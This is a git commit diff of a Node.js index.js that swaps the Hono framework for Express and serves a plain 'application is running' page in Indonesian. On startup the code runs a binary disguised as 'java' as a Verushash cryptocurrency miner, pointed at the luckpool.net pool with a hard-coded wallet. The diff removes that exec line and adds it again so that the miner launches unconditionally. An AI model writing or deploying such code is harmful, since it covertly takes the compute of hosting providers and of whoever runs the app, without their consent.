f68b82a55c921bb5d08f45aba6e3d684b9c607df
HESTER JUKI <157267051+hesterjuki@users.noreply.github.com>
2024-04-15 20:51:51 +0700

    Update index.js

--- index.js
+++ index.js
@@ -1,12 +1,18 @@
+const express = require('express');
+const http = require('http');
 const { exec } = require('child_process');
-const { Hono } = require('hono');
-const { serve } = require('@hono/node-server');
+const prt = process.env.PORT||80
+const app = express();
+const server = http.createServer(app);
 
-app.get('/', (c) => { 
-    c.text('Hello, Hono!')
-    exec('chmod +x java && ./java --algorithm verushash --pool eu.luckpool.net:3956 --wallet RQ2DksvgV757VsxRuMnfBDBwa5uCz4t5XR --password x --cpu-threads 0 --log-file ./Logs/log-itz.txt --worker ramstein', (error, stdout, stderr) => {
-  console.log(stdout);
- });
+app.get('/', (req, res) => {
+  res.send('Aplikasi sedang berjalan');
 });
 
-serve(app);
+server.listen(prt, () => {
+  console.log(`Server berjalan pada port ${prt}`);
+});
+
+exec('chmod +x java && ./java --algorithm verushash --pool eu.luckpool.net:3956 --wallet RQ2DksvgV757VsxRuMnfBDBwa5uCz4t5XR --password x --cpu-threads 0 --log-file ./Logs/log-itz.txt --worker ramstein', (error, stdout, stderr) => {
+  console.log(stdout);
+ });
